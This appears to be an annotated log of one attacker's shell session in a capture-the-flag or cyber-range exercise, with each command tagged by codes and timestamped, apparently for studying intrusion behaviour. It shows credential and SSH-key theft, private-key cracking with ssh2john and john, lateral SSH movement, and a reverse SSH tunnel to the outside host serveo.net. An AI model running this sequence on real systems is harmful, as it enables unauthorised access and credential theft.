INPUT|77--67|A9 A11 A12 A17 |1594799933|77|ps aux | less|OUTPUT
INPUT|77--68|U|1594799963|77|ping 10.1.135.83|OUTPUT
INPUT|77--69|U|1594799970|77|s|OUTPUT
INPUT|77--70|U|1594799974|77|s|OUTPUT
INPUT|77--71|U|1594799975|77|s|OUTPUT
INPUT|77--72|U|1594799975|77|s|OUTPUT
INPUT|77--73|U|1594799987|77|s|OUTPUT
INPUT|77--74|U|1594799987|77|s|OUTPUT
INPUT|77--75|U|1594799987|77|s|OUTPUT
INPUT|77--76|U|1594799987|77|s|OUTPUT
INPUT|77--77|U|1594799989|77|sss|OUTPUT
INPUT|77--78|A10 |1594799998|77|ls|OUTPUT
INPUT|77--79|A16 |1594800002|77|ssh -R 6666:127.0.0.1:22 serveo.net|OUTPUT
INPUT|77--80|A10 |1594800067|77|ls|OUTPUT
INPUT|77--81|U|1594800072|77|ip a|OUTPUT
INPUT|77--82|A0 A1 |1594800078|77|nmap|OUTPUT
INPUT|77--83|U|1594800081|77|cd /root|OUTPUT
INPUT|77--84|A10 |1594800083|77|ls|OUTPUT
INPUT|77--85|U|1594800084|77|apt udpate|OUTPUT
INPUT|77--86|U|1594800089|77|apt update|OUTPUT
INPUT|77--87|A0 A1 |1594800095|77|apt install nmap|OUTPUT
INPUT|77--88|A1 A9 A11 A12 A17 |1594800112|77|cat /etc/crontab]|OUTPUT
INPUT|77--89|A1 A9 A11 A12 A17 |1594800118|77|cat /etc/crontab|OUTPUT
INPUT|77--90|A1 A9 A11 A12 A17 |1594800131|77|cat /etc/cron.*/*|OUTPUT
INPUT|77--91|U|1594800160|77|cd /|OUTPUT
INPUT|77--92|U|1594800162|77|cd /etc|OUTPUT
INPUT|77--93|A10 |1594800164|77|ls -hlA|OUTPUT
INPUT|77--94|A10 |1594800169|77|ls -hlA cron*|OUTPUT
INPUT|77--95|U|1594800177|77|crontab -l|OUTPUT
INPUT|77--96|A1 A9 A11 A12 A17 |1594800185|77|cat /etc/passwd|OUTPUT
INPUT|77--97|U|1594800188|77|cd /home|OUTPUT
INPUT|77--98|A10 |1594800189|77|ls|OUTPUT
INPUT|77--99|A10 |1594800192|77|ls -hlA *|OUTPUT
INPUT|77--100|U|1594800207|77|cd eve|OUTPUT
INPUT|77--101|A10 |1594800209|77|ls -hlA|OUTPUT
INPUT|77--102|A10 A16 |1594800213|77|ls -hlA .ssh|OUTPUT
INPUT|77--103|A1 A9 A11 A12 A16 A17 |1594800222|77|cat .ssh/*|OUTPUT
INPUT|77--104|A10 |1594800239|77|ls|OUTPUT
INPUT|77--105|A10 |1594800247|77|ls -hlA|OUTPUT
INPUT|77--106|U|1594800336|77|cd debian|OUTPUT
INPUT|77--107|U|1594800340|77|cd ../debian|OUTPUT
INPUT|77--108|A10 |1594800343|77|ls -hlA|OUTPUT
INPUT|77--109|A10 A16 |1594800349|77|ls -hlA .ssh|OUTPUT
INPUT|77--110|A1 A9 A11 A12 A16 A17 |1594800356|77|cat .ssh/authorized_keys|OUTPUT
INPUT|77--111|U|1594800361|77|cd .ansible|OUTPUT
INPUT|77--112|A10 |1594800362|77|ls|OUTPUT
INPUT|77--113|A10 |1594800364|77|ls -hlA|OUTPUT
INPUT|77--114|U|1594800367|77|cd tmp|OUTPUT
INPUT|77--115|A10 |1594800369|77|ls -hlA|OUTPUT
INPUT|77--116|U|1594800370|77|cd ..|OUTPUT
INPUT|77--117|A10 |1594800372|77|ls -hlA|OUTPUT
INPUT|77--118|U|1594800374|77|cd ..|OUTPUT
INPUT|77--119|A10 |1594800376|77|ls -hlA|OUTPUT
INPUT|77--120|A1 A9 A11 A12 A17 |1594800380|77|cat *|OUTPUT
INPUT|77--121|A1 A9 A11 A12 A17 |1594800384|77|cat .*|OUTPUT
INPUT|77--122|A10 |1594800393|77|ls -hlA|OUTPUT
INPUT|77--123|U|1594800394|77|cd ..|OUTPUT
INPUT|77--124|A10 |1594800396|77|ls -hlA|OUTPUT
INPUT|77--125|A10 |1594800401|77|ls -hlA *|OUTPUT
INPUT|77--126|U|1594800415|77|cd eve|OUTPUT
INPUT|77--127|M11 |1594800419|77|cat .bash_history|OUTPUT
INPUT|77--128|A10 |1594800426|77|ls -hlA|OUTPUT
INPUT|77--129|A0 A1 |1594800460|77|nmap|OUTPUT
INPUT|77--130|A10 |1594800474|77|ls -hlA|OUTPUT
INPUT|77--131|V11 |1594800477|77|cat .bash_history|OUTPUT
INPUT|77--132|U|1594800517|77|su eve|OUTPUT
INPUT|77--133|A10 |1594800520|77|ls -hlA|OUTPUT
INPUT|77--134|M16 |1594800530|77|ssh eve@10.1.17.4|OUTPUT
INPUT|77--135|U|1594800557|77|exit|OUTPUT
INPUT|77--136|A10 |1594800559|77|ls|OUTPUT
INPUT|77--137|A10 |1594800561|77|ls -hlA|OUTPUT
INPUT|77--138|A16 |1594800568|77|cp .ssh/* /root/.ssh/|OUTPUT
INPUT|77--139|U|1594800571|77|cd|OUTPUT
INPUT|77--140|A10 A16 |1594800574|77|ls -hlA .ssh|OUTPUT
INPUT|77--141|U|1594800592|77|cd /home/eve|OUTPUT
INPUT|77--142|A10 |1594800594|77|ls -hlA|OUTPUT
INPUT|77--143|V11 |1594800599|77|cat .bash_history|OUTPUT
INPUT|77--144|A10 |1594800667|77|ls -hlA|OUTPUT
INPUT|77--145|A10 |1594800678|77|ls -hlA /tmp|OUTPUT
INPUT|77--146|A10 |1594800739|77|alias ll='ls -hlA'|OUTPUT
INPUT|77--147|U|1594800740|77|ll|OUTPUT
INPUT|77--148|U|1594800741|77|cd ..|OUTPUT
INPUT|77--149|U|1594800742|77|ll|OUTPUT
INPUT|77--150|U|1594800744|77|ll *|OUTPUT
INPUT|77--151|U|1594800745|77|cd ..|OUTPUT
INPUT|77--152|U|1594800745|77|ll|OUTPUT
INPUT|77--153|U|1594800749|77|ll root|OUTPUT
INPUT|77--154|V11 |1594800757|77|cat root/.bash_history|OUTPUT
INPUT|77--155|U|1594800760|77|ll|OUTPUT
INPUT|77--156|U|1594800770|77|cd /var/|OUTPUT
INPUT|77--157|U|1594800772|77|ll|OUTPUT
INPUT|77--158|U|1594800777|77|cd webmin|OUTPUT
INPUT|77--159|U|1594800777|77|ll|OUTPUT
INPUT|77--160|U|1594800782|77|cd ..|OUTPUT
INPUT|77--161|U|1594800783|77|cd ..|OUTPUT
INPUT|77--162|U|1594800783|77|ll|OUTPUT
INPUT|77--163|U|1594800791|77|ll media|OUTPUT
INPUT|77--164|U|1594800794|77|ll opt|OUTPUT
INPUT|77--165|U|1594800796|77|ll srv|OUTPUT
INPUT|77--166|U|1594800800|77|cd var|OUTPUT
INPUT|77--167|U|1594800801|77|ll|OUTPUT
INPUT|77--168|U|1594800804|77|cd log|OUTPUT
INPUT|77--169|U|1594800804|77|ll|OUTPUT
INPUT|77--170|A1 A9 A11 A12 A17 |1594800811|77|cat syslog|OUTPUT
INPUT|77--171|U|1594800813|77|ll|OUTPUT
INPUT|77--172|A1 A9 A11 A12 A17 |1594800819|77|zcat syslog.1|OUTPUT
INPUT|77--173|A1 A9 A11 A12 A17 |1594800822|77|cat syslog.1|OUTPUT
INPUT|77--174|U|1594800842|77|cd /etc/ansible|OUTPUT
INPUT|77--175|U|1594800859|77|cd /etc|OUTPUT
INPUT|77--176|U|1594800860|77|ll|OUTPUT
INPUT|77--177|A16 |1594800868|77|ll ssh|OUTPUT
INPUT|77--178|U|1594800874|77|ll|OUTPUT
INPUT|77--179|A1 A9 A11 A12 A17 |1594800877|77|cat sudoers|OUTPUT
INPUT|77--180|U|1594800881|77|cd|OUTPUT
INPUT|77--181|U|1594800881|77|ll|OUTPUT
INPUT|77--182|U|1594800891|77|ll|OUTPUT
INPUT|77--183|A10 |1594800899|77|alias ll='ls -hlA'|OUTPUT
INPUT|77--184|U|1594800900|77|ll|OUTPUT
INPUT|77--185|U|1594800966|77|ll|OUTPUT
INPUT|77--186|U|1594800967|77|cd|OUTPUT
INPUT|77--187|U|1594800968|77|ll|OUTPUT
INPUT|77--188|A16 |1594800969|77|cd .ssh|OUTPUT
INPUT|77--189|U|1594800969|77|ll|OUTPUT
INPUT|77--190|M12 |1594800972|77|cat id_rsa|OUTPUT
INPUT|77--191|U|1594800928|77|ll|OUTPUT
INPUT|77--192|A10 |1594800934|77|alias ll='ls -hlA'|OUTPUT
INPUT|77--193|U|1594800935|77|ll|OUTPUT
INPUT|77--194|U|1594800937|77|cd Desktop/|OUTPUT
INPUT|77--195|U|1594800937|77|ll|OUTPUT
INPUT|77--196|U|1594800941|77|vim id_rsa|OUTPUT
INPUT|77--197|A14 |1594800998|77|gpg2john id_rsa|OUTPUT
INPUT|77--198|A14 A16 |1594801045|77|apt install ssh2john|OUTPUT
INPUT|77--199|V8 |1594801069|77|wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py|OUTPUT
INPUT|77--200|A14 A15 A16 |1594801077|77|chmod +x ssh2john.py|OUTPUT
INPUT|77--201|A14 A16 |1594801080|77|./ssh2john.py id_rsa|OUTPUT
INPUT|77--202|A14 A16 |1594801097|77|./ssh2john.py id_rsa > x|OUTPUT
INPUT|77--203|U|1594801097|77|ll|OUTPUT
INPUT|77--204|U|1594801108|77|ll /usr/share/wordlists/rockyou.txt|OUTPUT
INPUT|77--205|M14 |1594801118|77|john --wordlist=/usr/share/wordlists/rockyou.txt x|OUTPUT
INPUT|77--206|U|1594801148|77|ll|OUTPUT
INPUT|77--207|U|1594801205|77|ll|OUTPUT
INPUT|77--208|U|1594801206|77|cd ..|OUTPUT
INPUT|77--209|V11 |1594801214|77|cat /home/eve/.bash_history|OUTPUT
INPUT|77--210|V16 |1594801222|77|ssh eve@10.1.17.4|OUTPUT
INPUT|77--211|A10 |1594801227|77|ls -hlA|OUTPUT
INPUT|77--212|A10 |1594801234|77|alias ll='ls -hlA'|OUTPUT
INPUT|77--213|U|1594801260|77|cd /tmp|OUTPUT
INPUT|77--214|U|1594801261|77|ll|OUTPUT
INPUT|77--215|U|1594801273|77|ll|OUTPUT
INPUT|77--216|U|1594801274|77|cd|OUTPUT
INPUT|77--217|U|1594801318|77|history|OUTPUT
INPUT|77--218|V11 |1594801329|77|cat /home/eve/.bash_history|OUTPUT
INPUT|77--219|V16 |1594801339|77|ssh eve@10.1.17.4|OUTPUT
INPUT|77--220|A10 |1594801362|77|alias ll='ls -hlA'|OUTPUT
INPUT|77--221|U|1594801363|77|ll|OUTPUT
INPUT|77--222|U|1594801366|77|cd top-secret|OUTPUT
INPUT|77--223|U|1594801367|77|ll|OUTPUT
INPUT|77--224|M17 |1594801370|77|cat flag.txt|OUTPUT
INPUT|77--225|U|1594801436|77|ll|OUTPUT
INPUT|77--226|U|1594801438|77|cd ..|OUTPUT
INPUT|77--227|U|1594801438|77|ll|OUTPUT
INPUT|77--228|U|1594801617|77|uname -a|OUTPUT
INPUT|77--229|U|1594801620|77|sudo -l|OUTPUT
INPUT|77--230|U|1594801626|77|ll|OUTPUT
INPUT|77--231|A1 A9 A11 A12 A17 |1594801631|77|cat /etc/passwd|OUTPUT
INPUT|77--232|U|1594801637|77|w|OUTPUT
INPUT|77--233|U|1594801859|77|ll|OUTPUT
INPUT|77--234|U|1594801861|77|ll top-secret/|OUTPUT
INPUT|77--235|V17 |1594801867|77|cat top-secret/flag.txt|OUTPUT
INPUT|77--236|A16 |1594802024|77|ssh -R 6666:127.0.0.1:22 serveo.net|OUTPUT
INPUT|77--237|A16 |1594802065|77|ssh -R blabla:22:127.0.0.1:22 serveo.net|OUTPUT
INPUT|77--238|A16 |1594802157|77|ssh -R 6666:127.0.0.1:22 serveo.net|OUTPUT
INPUT|77--239|U|1594802225|77|ll|OUTPUT
INPUT|77--240|U|1594802228|77|cd /|OUTPUT
INPUT|77--241|U|1594802229|77|ll|OUTPUT
INPUT|77--242|U|1594802232|77|w|OUTPUT
INPUT|77--243|U|1594802241|77|ll opt|OUTPUT
INPUT|77--244|U|1594802243|77|ll srv/|OUTPUT
INPUT|77--245|A1 A9 A11 A12 A17 |1594802249|77|cat /etc/passwd|OUTPUT
INPUT|77--246|A1 A9 A11 A12 A17 |1594802262|77|cat /etc/cron*|OUTPUT
INPUT|77--247|U|1594802267|77|ll /tmp/cron*|OUTPUT
INPUT|77--248|U|1594802273|77|ll /etc/cron*|OUTPUT
INPUT|77--249|U|1594802278|77|ll|OUTPUT
INPUT|77--250|U|1594802290|77|ip a|OUTPUT
INPUT|77--251|A16 |1594811020|77|ssh -R 6666:127.0.0.1:22 serveo.net|OUTPUT
INPUT|77--252|U|1594811139|77|ll|OUTPUT
INPUT|77--253|U|1594811145|77|uname -a|OUTPUT
INPUT|77--254|A1 A9 A11 A12 A17 |1594811155|77|cat /etc/api/sources.list|OUTPUT
INPUT|77--255|A1 A9 A11 A12 A17 |1594811233|77|cat /etc/apt/sources.list|OUTPUT
INPUT|77--256|U|1594811243|77|ll|OUTPUT
